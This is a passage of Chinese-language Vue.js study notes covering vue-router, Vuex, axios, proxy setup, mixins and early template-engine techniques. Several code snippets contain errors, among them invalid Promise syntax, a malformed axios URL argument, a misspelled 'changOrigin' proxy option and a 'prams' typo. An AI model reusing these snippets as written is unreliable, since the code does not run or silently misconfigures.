      console.log('obj.a changed');
    },
    immediate: true,
    deep: true
  }
}
```

 这样的方法对性能影响很大，修改obj里面任何一个属性都会触发这个监听器里的 handler。所以尽量少使用

实际开发中，watch会随着组件一并销毁。

## 				vue-cli脚手架

## 				vue-router路由

### **前端路由如何实现的？**

- 改变URL，但是页面不进行整体的刷新。

**怎么实现呢？**

URL的hash

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220636.png" alt="image-20201021235831243" style="zoom:67%;" />

还有html5的history

这些方法都会改变url，但是不会让页面重新刷新

vue-router就是基于以上实现的

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220639.png" alt="image-20201022001834640" style="zoom: 50%;" />

### vue-router的基本使用

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220644.png" alt="image-20201022001958526" style="zoom: 67%;" />

安装的话可以使用脚手架自动安装也可以手动安装

第一步导入路由对象：import VueRouter from 'vue-router'

第二步创建路由实例：

```
	import Vue from 'vue'
     import VueRouter from 'vue-router'
     import Main from '../views/Main.vue'
     import CategoryEdit from 'views/CategoryEdit'
     import CategoryList from 'views/CategoryList'
	Vue.use(VueRouter)
     const routes = [
       {
         path: '',
         //路由重定向
         redirect: '/main',
       },
       {
         path: '/main',
         name: 'Main',
         component: Main,
         children: [
           {
             path: '/categories/create',
             component: CategoryEdit,
           },
           {
             path: '/categories/list',
             component: CategoryList,
           },
         ],
       },
     ]
     创建路由实例
     const router = new VueRouter({
       mode: 'history',
       base: process.env.BASE_URL,
       routes,
     })
     export default router
```

第三步：在Vue实例挂载路由实例

在main.js中：

```
     import http from 'network/index'
     new Vue({
      router,
      store,
      render: (h) => h(App),
     }).$mount('#app')			
```

如何使用呢？

可以通过this.$router.push('/categories/list')和this.$router.replace('/categories/list'),前者会保存历史，后者不会保存

通过上面方法可以改变url但不会重新刷新，然后$router会根据url重新渲染页面

当然要渲染在哪里，需要一个标签<router-view/>

还可以用<keep-alive>包裹<router-view/>来保持状态，防止被销毁,使用keep-alive的保持的组件都要有name属性

![image-20201022004516279](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220648.png)

这时候的push和replace实际就是history的pushState和replaceState方法

一级路由会在任何的<router-view/>中渲染对应的模板，App.vue中的 `<router-view>` 是最顶层的出口，渲染最高级路由匹配到的组件。子路由只会在父路由的<router-view/>中的模板的<router-view/>渲染

### Vue**的前进和后退**

> 项目开发的时候，有时候可能需要我们来对页面后退和前进，这个东西跟浏览器自带的前进后退功能很像

1. 后退功能

   vue中的后退有好多种方法可以使用，`使用这些方法前要确认有之前的页面，否则后退就到了一个空页面！`

   可以通过history.length来获取历史记录的长度

   ```
   console.log(history.length)
   ```

   `1.window.history`对象中保存有页面访问的历史记录，在编写时可不使用 window 这个前缀。 加载历史列表中的前一个URL，这与在浏览器中点击前进按钮是相同的

   window.history.back();  后退1步

   history.back();        后退1步

   `2.this.$router.go(-1);`   通过vue的路由来进行后退1步

     this.$router.go(-2);   后退2步

     this.$router.back();   后退1步

2. 前进功能

   可以通过history.forward(); 来加载历史列表中的下一个URL，这与在浏览器中点击前进按钮是相同的,`使用前需要确认有下一个URL，否则没反应~`

### 动态路由

#### 用法一

定义

![image-20201022005021089](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220652.png)

使用

![image-20201022005410642](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220655.png)

![image-20201022005341350](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220658.png)

跳转的页面展示：

![image-20201022005756913](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220701.png)

![image-20201022005741368](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220705.png)

**this.$route.prams是获取当前活跃的页面的路由的参数，可以通过动态路由来传递数据**

**this.$route.path是获取当前活跃的页面的路由的参数**



#### 用法二

在路由定义对象中加上props:true,然后在跳转的页面的props定义对应的变量就可以直接传值了

```
     routes:[
     path:’/about/:param’,
     component:About,
     props:true//这个表示用法一的$router.params会通过props传给下一个url中的props
     ]
```

```
	//跳转的页面
	props:{
		param:''
	}
```



### 路由传递参数的另外两种方式

我们经常使用this.$router.push("/home");,参数为字符串的方式来方式来跳转，这种方式很简单，但是不能传递参数

下面介绍的两种传递路由参数的方法都是以对象的方式进行传递

#### 命名路由

> 命名路由的前提就是在注册路由的地方需要给路由（跳转后的页面）命名如：

<img src="https://img-blog.csdn.net/20180706161414540?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTQzMDczNDk=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img" style="zoom:80%;" />

命名路由传递参数需要使用params来传递，这里一定要注意使用params不是query。目标 页面接收传递参数时使用params

`特别注意：命名路由这种方式传递的参数，如果在目标页面刷新是会出错的`，因为刷新后prams就为空了

使用方法如下：

```
	this.$router.push({ name: 'news', params: { userId: 123 }})
```

代码如下：

```
	 <template>
       <div class="hello">
         <h1>未跳转的页面</h1>
         <button @click="routerTo">click here to news page</button>
       </div>
     </template>
     <script>
     export default {
       name: 'HelloWorld',
       methods:{
         routerTo(){
           this.$router.push({ name: 'news', params: { userId: 123 }});
         }
       }
     }
```

接收传递的参数：

```
     <template>
       <div>
         this is the news page.the transform param is {{this.$route.params.userId}}
       </div>
     </template>
     <script>
     </script>
```

#### 查询参数传递（推荐使用）

> 查询参数其实就是在路由地址后面带上参数和传统的url参数一致的，传递参数使用query而且必须配合path来传递参数而不能用name，目标页面接收传递的参数使用query。

`注意：和name配对的是params，和path配对的是query`

使用方法如下：

```
	this.$router.push({ path: '/news', query: { userId: 123 }});
```

代码如下：

```
     <template>
       <div class="hello">
         <h1>跳转前</h1>
         <button @click="routerTo">click here to news page</button>
       </div>
     </template>
     <script>
     export default {
       name: 'HelloWorld',
       methods:{
         routerTo(){
           this.$router.push({ path: '/news', query: { userId: 123 }});
         }
       }
     }
     </script>
```

接收参数如下：

```
<template>
  <div>
    跳转后 {{this.$route.query.userId}}
  </div>
</template>
<script>
</script>
```

最后总结：路由传递参数和传统传递参数是一样的，命名路由类似表单提交而查询就是url传递，在vue项目中基本上掌握了这两种传递参数就能应付大部分应用了，最后总结为以下两点：
***\*1.命名路由搭配params，刷新页面参数会丢失
	2.查询参数搭配query，刷新页面数据不会丢失
	3.接受参数使用this.$router后面就是搭配路由的名称就能获取到参数的值\****

另外，二者还有点区别，直白的来说query相当于get请求，页面跳转的时候，可以在地址栏看到请求参数，而params相当于post请求，参数不会再地址栏中显示

### 路由的懒加载

### 嵌套路由（子路由）

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220708.png" alt="image-20201022010256373" style="zoom:67%;" />

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220711.png" alt="image-20201022010413211" style="zoom:67%;" />

路由配置`（记住，子路由开头不能加/)`

![image-20201022010954082](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220715.png)

使用

![image-20201022010828374](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220720.png)

子路由的view-router只能在父路由的组件中写router-view

### 导航守卫

1. 全局路由钩子

   > 是指路由实例上直接操作的钩子函数，他的特点是所有路由配置的组件都会触发，直白点就是触发路由就会触发这些钩子函数

   **beforeEach(to,from, next)**

   这个钩子作用主要是用于登录验证，在路由跳转前触发

   基本使用：

   ```
   router.beforeEach((to, from, next) => {
     if (to.path === '/Login') {
       next()
     } else {
       let token = localStorage.token
       if (!token) {
         next('/Login')
       } else {
         next()
       }
     }
   })//这些代码写在router文件夹中的index.js下
   ```

   next('/Login')就是跳转到/Login路由，next()就是正常跳转，详情请看下面介绍

   **beforeResolve(to,from, next)**

   这个钩子和beforeEach类似，也是路由跳转前触发，即在 beforeEach 和 组件内beforeRouteEnter 之后，afterEach之前调用。

   **afterEach(to,from)；**

   和beforeEach相反，他是在路由跳转完成后触发，`参数包括to,from没有了next（参数会单独介绍）`,他发生在beforeEach和beforeResolve之后，beforeRouteEnter（组件内守卫，后讲）之前。

2.  独享路由钩子

   > 指在单个路由配置的时候也可以设置的钩子函数，其位置就是下面示例中的位置

   ```
   const router = new VueRouter({
     routes: [
       {
         path: '/foo',
         component: Foo,
         beforeEnter: (to, from, next) => {
           // ...
         }
       }
     ]
   })
   ```

   **beforeEnter(to,from, next)；**

   和beforeEach完全相同，在该组件渲染前执行，如果都设置则在beforeEach之后紧随执行，参数to、from、next

3. 组件内路由钩子

   ```
   指在组件内执行的钩子函数，类似于组件内的生命周期，相当于为配置路由的组件添加的生命周期钩子函数。
   ```

   **beforeRouteEnter(to,from, next)**

   路由进入之前调用，参数包括to，from，next。该钩子在全局守卫beforeEach和独享守卫beforeEnter之后，全局beforeResolve和全局afterEach之前调用，要注意的是该守卫内访问不到组件的实例，也就是this为undefined，也就是他在beforeCreate生命周期前触发。在这个钩子函数中，可以通过传一个回调给 next来访问组件实例。在导航被确认的时候执行回调，并且把组件实例作为回调方法的参数，可以在这个守卫中请求服务端获取数据，当成功获取并能进入路由时，调用next并在回调中通过 vm访问组件实例进行赋值等操作，（next中函数的调用在mounted之后：为了确保能对组件实例的完整访问）。

   **beforeRouteUpdate(to,from, next)**

   在当前路由改变时，并且该组件被复用时调用，可以通过this访问实例。参数包括to，from，next。可能有的同学会疑问，what is 路由改变 or what is 组件被复用？

   - 对于一个带有动态参数的路径 /foo/:id，在 /foo/1 和 /foo/2 之间跳转的时候，组件实例会被复用，该守卫会被调用
   - 当前路由query变更时，该守卫会被调用

   **beforeRouteLeave(to,from, next)**

   导航离开该组件的对应路由时调用，可以访问组件实例`this`，参数包括to，from，next。

   ```
   <template>
     ...
   </template>
   export default{
     data(){
       //...
     },
     beforeRouteEnter (to, from, next) {
       // 在渲染该组件的对应路由被 confirm 前调用
       // 不！能！获取组件实例 `this`
       // 因为当守卫执行前，组件实例还没被创建
     },
     beforeRouteUpdate (to, from, next) {
       // 在当前路由改变，但是该组件被复用时调用
       // 举例来说，对于一个带有动态参数的路径 /foo/:id，在 /foo/1 和 /foo/2 之间跳转的时候，
       // 由于会渲染同样的 Foo 组件，因此组件实例会被复用。而这个钩子就会在这个情况下被调用。
       // 可以访问组件实例 `this`
     },
     beforeRouteLeave (to, from, next) {
       // 导航离开该组件的对应路由时调用
       // 可以访问组件实例 `this`
     }
   }
   ```

   **导航守卫回调参数**

   to：目标路由对象；

   from：即将要离开的路由对象；

   next：他是最重要的一个参数，他相当于佛珠的线，把一个一个珠子逐个串起来。以下注意点务必牢记：

   1.但凡涉及到有next参数的钩子，必须调用next() 才能继续往下执行下一个钩子，否则路由跳转等会停止。

   2.如果要中断当前的导航要调用next(false)。如果浏览器的 URL 改变了 (可能是用户手动或者浏览器后退按钮)，那么 URL 地址会重置到`from`路由对应的地址。（主要用于登录验证不通过的处理）

   3.当然next可以这样使用，next('/') 或者 next({ path: '/' }): 跳转到一个不同的地址。意思是当前的导航被中断，然后进行一个新的导航。可传递的参数与[router.push](https://link.zhihu.com/?target=https%3A//router.vuejs.org/zh/guide/essentials/navigation.html)中选项一致。

   4.在beforeRouteEnter钩子中next((vm)=>{})内接收的回调函数参数为当前组件的实例vm，这个回调函数在生命周期mounted之后调用，也就是，他是所有导航守卫和生命周期函数最后执行的那个钩子。

   5.next(error): (v2.4.0+) 如果传入 `next` 的参数是一个 `Error` 实例，则导航会被终止且该错误会被传递给 `router.onError()` 注册过的回调。

   总结：
   **当点击切换路由时：beforeRouterLeave-->beforeEach-->beforeEnter-->beforeRouteEnter-->beforeResolve-->afterEach-->beforeCreate-->created-->beforeMount-->mounted-->beforeRouteEnter的next的回调**，

   **当路由更新时：beforeRouteUpdate**

   <img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220723.png" alt="image-20201107173715727" style="zoom:80%;" />

## 				vue-x

**vuex是做什么的？**

官方解释：Vuex是一个专为Vue.js应用程序开发的状态管理模式。

- 它采用`集中式存储管理`应用的所有组件的状态(state),并以相应的规则保证状态以一种可预测的方式发生变化。
- Vuex也集成到Vue的官方调试工具Devtools extension,提升了诸如零配置的time-travel调试、状态快照导入导出等高级调试功能。

### State

#### **基本使用**（不建议使用）

在store文件夹中的index.js添加以下代码（如果使用脚手架创建时选择了vuex功能那么以下代码会自动生成）：

```
     import Vue from 'vue'
     import Vuex from 'vuex'
     //使用插件
     Vue.use(Vuex)
     //创建并导出实例对象
     export default new Vuex.Store({
         state: {
         //全局数据，可以在任何组件使用
             counter: 1000,
             studentarr:[]
         },
         mutations: {
         },
         actions: {},
         modules: {}
     })
```

在main.js中加上以上代码（如果使用脚手架创建时选择了vuex功能那么以下代码会自动生成）：

```
     import Vue from 'vue'
     import App from './App.vue'
     import router from './router'
     import store from './store'
     Vue.config.productionTip = false
     new Vue({
       router,
       //挂载vuex实例对象
       store,
       render: h => h(App)
     }).$mount('#app')
```

上面代码配置完毕后就可以在任何组件使用vuex中的数据和方法了，在<script>中调用使用：this.$store.state.couter,

在<template>中调用使用：$store.state.counter

例如在home.vue中使用(直接修改state)：

![image-20201020205124071](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220726.png)

![image-20201020205619263](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220730.png)

上面是最简单的使用方式，但是这样使用会导致Devtools无法监控数据的修改情况

为什么会这样呢？

![image-20201020205936930](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220733.png)

因为这是vue官方规定的 ，但并不强制，而且这样这是可以的，并且devtools也能监控到数据变化，但是只能监控同步数据，

异步数据需要用action->mutations->state

![image-20201020210332281](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220741.png)

### Mutations

处理同步函数

下面是第二种方法（通过mutations修改state）:

在store中的index.js的mutations加上方法：

```
	import Vue from 'vue'
     import Vuex from 'vuex'
     //使用插件
     Vue.use(Vuex)
     //创建并导出实例对象
     export default new Vuex.Store({
         state: {
         //全局数据，可以在任何组件使用
             counter: 1000,
             studentarr:[]
         },
         //定义mutations方法
         mutations: {
         	  increment(state){
         	  	state.counter++
         	  }
         },
         actions: {},
         modules: {}
     })
```

调用mutations方法：

```
 methods: {
    add() {
      this.$store.commit('increment')
    },
  },
```

那么mutations该怎么携带参数呢？

```
mutations: {
    istabbar(state, istrue) {
      state.main = istrue
    },
    addstudent(state, student) {
      state.studentarr.push(student)
    },
  },
```

```
methods: {
    addstudent() {
      let stu = {
        name: '卢本伟',
        mark: 89,
      }
      //这样只能携带一个参数，如果希望传入多个参数，可以以对象的形式传
      this.$store.commit('addstudent', stu)
    },
  },
```

### Actions

处理异步函数

第三种方法(action->mutations->state)：

Vuex要求我们Mutations中的方法必须是同步方法。

```
      state: {
         main: 'true',
         studentarr: [{ name: '卢本伟', mark: 78 }],
       },
       mutations: {
         istabbar(state, istrue) {
           state.main = istrue
         },
         addstudent(state, student) {
           state.studentarr.push(student)
         },
       },
       actions: {
         //context上下文，这里的context相当于state
         aAddstudent(context, stu) {
           setInterval(() => {
             context.commit('addstudent', stu)
           }, 1000)
         },
       },
```

```
 methods: {
    addstudent() {
      let stu = {
        name: '卢本伟',
        mark: 89,
      }
      this.$store.dispatch('aAddstudent', stu)
    },
  },
```

如果需要回调函数还可以这样：

```
 actions: {
    //context上下文，这里的context相当于state
    aAddstudent(context, stu) {
      setInterval(() => {
        context.commit('addstudent', stu.payload)
        stu.success()
      }, 1000)
    },
  },
```

```
  this.$store.dispatch('aAddstudent', {
        payload: stu,
        success: () => {
          console.log('执行完成')
        },
      })
```

或者这样(`最推荐`）：

```
 actions: {
    //context上下文，这里的context相当于state
    aAddstudent(context, stu) {
     return new Promise((reslove,reject)={
		setInterval(() => {
        context.commit('addstudent', stu.payload)
        resolve('执行完毕了')
      }, 1000)
	}) 
    },
  },
```

```
  this.$store.dispatch('aAddstudent', {
        payload: stu,
        success: () => {
          console.log('执行完成')
        },
      }).then(res=>{
      console.log(res)
      })
```

### Module

Module是模块的意思，为什么在Vuex中我们要使用模块呢？

- Vue使用单一状态树，那么也意味着很多状态都会交给Vuex来管理
- 当应用变得非常复杂时，store对象就有可能变得相当臃肿
- 为了解决这个问题，Vuex允许我们将store分割成模块（Module)，而每个模块拥有自己的state,mutation,action

## axios

### 基本使用

axios功能特点：

- 在浏览器中发送XMLHttpRequests请求
- 在node.js中发送http请求
- 支持Promise API
- 拦截请求和响应
- 转换请求和响应数据

1. 安装axios(vue是不自带axios的，需要手动安装)

   ```
   npm install axios --save
   ```

2. 引入并配置axios

   第一步：创建network文件夹（非必须，个人习惯），在network文件夹下创建request.js

   request.js输入以下内容：

   ```
   import axios from 'axios'
   const http = axios.create({
     baseURL: 'http://localhost:3000/api/admin',//这个按实际情况填写
   })
   export default http
   ```

   第二部：在main.js中引入并配置axios(`推荐使用`)

   如果想获取baseUrl,需要$http.defaults.baseUrl

   输入以下代码：

   ```
   import http from 'network/index'
   Vue.prototype.$http = http//这样可以让axios在所有组件中使用
   ```

3. 基本使用

   <img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220745.png" alt="image-20201020232129637" style="zoom:80%;" />

   **1、axios(config)**

   ```
   import axios from 'axios'
   //如果method不写，默认是get请求
     axios({
     	 method:'get'
         url: 'http://152.136.185.210:8000/home/data?type=sell&page=3',
    }).then((res) => {
         console.log(res)
    })
   ```

   ```
     axios({
         url: 'http://152.136.185.210:8000/home/data',
         //专门针对get请求的参数拼接
         params:{
           type='top',
           page:1
         }}).then((res) => {
         console.log(res)
       })
   ```

   2、axios.get(url[,config]),中括号[]里面的表示可选，config表示配置

   ```
   import axios from 'axios'
   //如果method不写，默认是get请求
     axios.get('http://152.136.185.210:8000/home/data?type=sell&page=3',{
     	 method:'get'
    }).then((res) => {
         console.log(res)
    })
   ```

   3、axios.post(url[,data[,config]])

   ```
   import axios from 'axios'
   //如果method不写，默认是get请求
     axios.post('http://152.136.185.210:8000',{
     	name:'lisi',
     	age:18
    }).then((res) => {
         console.log(res)
    })
   ```

注意：axios请求返回的是一个promise，我们需要用.then(res =>{})来拿到正常的数据类型

### axios发送并发请求

指定一个或几个请求发送接收完毕再处理

```
 axios
      .all([
        axios.get('url: 'http://152.136.185.210:8000/home/data',
          {
          params: {
            type: 'top',
            page: 1,
          },
        }),
        axios.get('url: 'http://152.136.185.210:8000/home/data'),
      ])
      .then(
        axios.spread((res1, res2) => {
          console.log(res1)
          console.log(res2)
        })
      )
```

其中res1对应第一个请求结果，res2对应第二个请求结果

![image-20201021005944417](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220748.png)

### 全局配置

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220753.png" alt="image-20201021010330644" style="zoom:67%;" />

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220757.png" alt="image-20201021012609384" style="zoom:67%;" />

### axios的实例

```
   const instance1 = axios.create({
      baseURL: 'http://localhost:3005/admin/api',
      timeout: 5000,
    })
    instance1.get('/index').then((res) => {
      console.log(res)
    })
```

### axios模块封装

为了实现可复用，我们一般会采用封装的形式使用axios，也就是再network文件夹创建request.js,然后向外暴露接口，

有需要使用网络请求的直接调用这个接口

使用实例：

在network中的request.js中：

```
	import axios from 'axios'
     export function request(config) {
       // 1、创建axios的实例
       const instance = axios.create({
         baseURL: 'http://152.136.185.210:8000',
         timeout: 5000,
       })
       //发送真正的网路请求
       return instance(config)
     }
```

在其他组件中：

```
	import { request } from './network/request'	
	request({
      url: '/home/data',
    })
      .then((res) => {
        console.log(res)
      })
      .catch((err) => {
        console.log(err)
      })
```

当然，上面方法还是需要在每个组件中导入，所以还不够好，以下方案比较推荐使用，不需要每次都导入，直接可以用$http引用

第一步：创建network文件夹（非必须，个人习惯），在network文件夹下创建request.js

request.js输入以下内容：

```
     import axios from 'axios'
     const http = axios.create({
       baseURL: 'localhost:3000/admin/api',//这个按实际情况填写
     })
     export default http
```

第二部：在main.js中引入并配置axios(`推荐使用`)

输入以下代码：

```
     import http from 'network/index'
     Vue.prototype.$http = http//这样可以让axios在所有组件中使用
```

### axios拦截器（interceptors)的使用

request请求拦截器：发送请求前统一处理，如：设置请求头headers、应用的版本号、终端类型,登录token等。

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220802.png" alt="image-20201107110132399" style="zoom:67%;" />	  

config就是发送的请求，必须return 返回，请求才能继续发送

如果我们想阻止发送请求或者接收请求，我们可以返回一个Promise.reject(err)

response响应拦截器：有时候我们要根据响应的状态码来进行下一步操作，例如：由于当前的token过期，接口返回401未授权，那我们就要进行重新登录的操作。

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220806.png" alt="image-20201107110154752" style="zoom:80%;" />

响应拦截可以实现登录控制，和返回数据处理

### 处理跨域

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210326090227.png" style="zoom:67%;" />

在vue.config.js（如果没有就在项目根目录新创建）中加上如下代码：

![image-20201017122820391](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220809.png)

```
//解决跨域问题
  devServer: {
    proxy: {
      //配置跨域
      '/api': {
        target: 'http://121.121.67.254:8185/', //这里后台的地址模拟的;应该填写你们真实的后台接口
        changOrigin: true, //允许跨域
      },
    },
  },
```

其中/api的意思是拦截你所有带有/api的请求，然后让拦截的本地模拟服务器请求数据，这样就不会产生跨域了

`设置跨域后，组件中的请求地址就不能再带ip和端口了，因为这里设置的跨域处理会默认帮加上的，组件的请求的往本地服务器请求的，如果没有`

`注意：如果使用代理，那么axios请求就不需要写域名和ip了，否则还会报错`

![image-20210326084618241](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210326084618.png)

`需要把域名端口去掉，或者加上和网页运行的域名端口，而不是服务器的域名和端口，服务器的端口和域名，代理会进行处理转发`

## mixins

mixins基础概况

vue中的解释是这样的，如果觉得语言枯燥的可以自行跳过嘿~

混入 (mixins)： 是一种分发 Vue 组件中可复用功能的非常灵活的方式。混入对象可以包含任意组件选项。当组件使用混入对象时，所有混入对象的选项将被混入该组件本身的选项。

怎么用？

举个栗子：

定义一个混入对象

![img](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210406221445.webp)

把混入对象混入到当前的组件中

![img](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210406221706.webp)

用法似不似相当简单呀

mixins的特点

**1、 方法和参数在各组件中不共享**

混合对象中的参数num

![](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210406222110.webp)

组件1中的参数num进行+1的操作

![img](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210406222216.webp)

组件2中的参数num未进行操作

![img](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210406222411.webp)

看两组件中分别输出的num值

![img](https:////upload-images.jianshu.io/upload_images/10069417-951e440b483654f1.png?imageMogr2/auto-orient/strip|imageView2/2/w/647/format/webp)

![img](https:////upload-images.jianshu.io/upload_images/10069417-051a611fa184eb4b.png?imageMogr2/auto-orient/strip|imageView2/2/w/580/format/webp)

大家可以看到，我在组件1里改变了num里面的值，组件2中的num值还是混入对象里的初始值

**2、 值为对象的选项，如methods,components等，选项会被合并，键冲突的组件会覆盖混入对象的**

**混入对象中的方法**

![img](https:////upload-images.jianshu.io/upload_images/10069417-7eb65d68e5f3ad23.png?imageMogr2/auto-orient/strip|imageView2/2/w/825/format/webp)

组件中的方法

<img src="https:////upload-images.jianshu.io/upload_images/10069417-4bb148ff01d43768.png?imageMogr2/auto-orient/strip|imageView2/2/w/1027/format/webp" alt="img" style="zoom:80%;" />

打印台的输出

![img](https:////upload-images.jianshu.io/upload_images/10069417-1dbd24819335b26d.png?imageMogr2/auto-orient/strip|imageView2/2/w/542/format/webp)

**3、 值为函数的选项，如created,mounted等，就会被合并调用，混合对象里的钩子函数在组件里的钩子函数之前调用**

**混入对象函数中的console**

![img](https:////upload-images.jianshu.io/upload_images/10069417-8d9de93e376fea49.png?imageMogr2/auto-orient/strip|imageView2/2/w/749/format/webp)

组件函数中的console

![img](https:////upload-images.jianshu.io/upload_images/10069417-e7d281e45b2a6274.png?imageMogr2/auto-orient/strip|imageView2/2/w/743/format/webp)

打印台的打印

![img](https:////upload-images.jianshu.io/upload_images/10069417-4e01bb1cadb4055a.png?imageMogr2/auto-orient/strip|imageView2/2/w/554/format/webp)

**当然，混入组件也是可以的**

![image-20210406231022018](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210406231022.png)

![image-20210406231051345](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210406231051.png)

![image-20210406231138407](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210406231139.png)

**全局混入**

混入也可以进行全局注册。使用时格外小心！一旦使用全局混入，它将影响**每一个**之后创建的 Vue 组件。使用恰当时，这可以用来为自定义选项注入处理逻辑。

**方法一：在工程的main.js中直接注册，实现如下：**

```
     import Vue from 'vue';
     import App from './App';

     Vue.mixin({
       created() {
         console.log('全局混入的钩子函数');
       }
     });

     /* eslint-disable no-new */
     new Vue({
       el: '#app',
       components: { App },
       template: '<App/>'
     });
```

**方法二**：模块化注册，新建mixin.js文件并添加以下代码：

```
	export default {
       install(Vue) {
         Vue.mixin({
           created() {
             console.log('全局混入的钩子函数');
           },
           methods:{
           	test(){
           		console.log("test")
           	}
           }
         })
       }
     }
```

然后在main.js中引入该文件并使用use方法进行注册

```
     import Vue from 'vue';
     import App from './App';
     import myMixin from './mixin.js';

     Vue.use(myMixin);

     /* eslint-disable no-new */
     new Vue({
       el: '#app',
       components: { App },
       template: '<App/>'
     });
```

然后在任何组件都可以使用了，并且不需要引入

比如在一个组件中使用：

可以直接使用this.test()

与vuex的区别

经过上面的例子之后，他们之间的区别应该很明显了哈~

vuex：用来做状态管理的，里面定义的变量在每个组件中均可以使用和修改，在任一组件中修改此变量的值之后，其他组件中此变量的值也会随之修改。

Mixins：可以定义共用的变量，在每个组件中使用，引入组件中之后，各个变量是相互独立的，值的修改在组件中不会相互影响。

与公共组件的区别

同样明显的区别来再列一遍哈~

组件：在父组件中引入组件，相当于在父组件中给出一片独立的空间供子组件使用，然后根据props来传值，但本质上两者是相对独立的。

Mixins：则是在引入组件之后与组件中的对象和方法进行合并，相当于扩展了父组件的对象与方法，可以理解为形成了一个新的组件。

`注意：请谨慎使用全局混入，因为它会影响每个单独创建的 Vue 实例 (包括第三方组件)。`

​			`大多数情况下，只应当应用于自定义选项，就像上面示例一样。推荐将其作为[插件]发布，``以避免重复应用混入。`

## Vue源码解析

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220812.png" alt="image-20210221172208779" style="zoom:50%;" />

### 模板引擎

> 模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的[HTML](https://baike.baidu.com/item/HTML/97049)文档。简单来说就是把数据变为视图。

#### **历史出现的数据变为视图的方法**

##### 纯DOM法

> 非常笨拙，没有实战价值，但是非常底层

案例：

```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>
<body>
  <ul id="list">
  </ul>
  <script>
    var arr = [
      { "name": "小明", "age": 12, "sex": "男" },
      { "name": "小红", "age": 11, "sex": "女" },
      { "name": "小强", "age": 13, "sex": "男" }
    ];
    var list = document.getElementById('list');
    for (var i = 0; i < arr.length; i++) {
      // 每遍历一项，都要用DOM方法去创建li标签
      let oLi = document.createElement('li');
      // 创建hd这个div
      let hdDiv = document.createElement('div');
      hdDiv.className = 'hd';
      hdDiv.innerText = arr[i].name + '的基本信息';
      // 创建bd这个div
      let bdDiv = document.createElement('div');
      bdDiv.className = 'bd';
      // 创建三个p
      let p1 = document.createElement('p');
      p1.innerText = '姓名：' + arr[i].name;
      bdDiv.appendChild(p1);
      let p2 = document.createElement('p');
      p2.innerText = '年龄：' + arr[i].age;
      bdDiv.appendChild(p2);
      let p3 = document.createElement('p');
      p3.innerText = '性别：' + arr[i].sex;
      bdDiv.appendChild(p3);
      // 创建的节点是孤儿节点，所以必须要上树才能被用户看见
      oLi.appendChild(hdDiv);
      // 创建的节点是孤儿节点，所以必须要上树才能被用户看见
      oLi.appendChild(bdDiv);
      // 创建的节点是孤儿节点，所以必须要上树才能被用户看见
      list.appendChild(oLi);
    }
  </script>
</body>
</html>
```

效果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220815.png" alt="image-20210209133027028" style="zoom:67%;" />

##### 数组join法

> 曾几何时非常流行，是曾经前端必会知识

实例：

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>
<body>
  <ul id="list"></ul>
  <script>
    var arr = [
      { "name": "小明", "age": 12, "sex": "男" },
      { "name": "小红", "age": 11, "sex": "女" },
      { "name": "小强", "age": 13, "sex": "男" }
    ];
    var list = document.getElementById('list');
    // 遍历arr数组，每遍历一项，就以字符串的视角将HTML字符串添加到list中
    for (let i = 0; i < arr.length; i++) {
      list.innerHTML += [
        '<li>',
        '    <div class="hd">' + arr[i].name + '的信息</div>',
        '    <div class="bd">',
        '        <p>姓名：' + arr[i].name + '</p>',
        '        <p>年龄：' + arr[i].age + '</p>',
        '        <p>性别：' + arr[i].sex + '</p>',
        '    </div>',
        '</li>'
      ].join('')
    }
  </script>
</body>
</html>
```

效果：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220819.png" alt="image-20210209162722775" style="zoom:67%;" />

##### ES6的反引号法

实例：

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>
<body>
  <ul id="list"></ul>
  <script>
    var arr = [
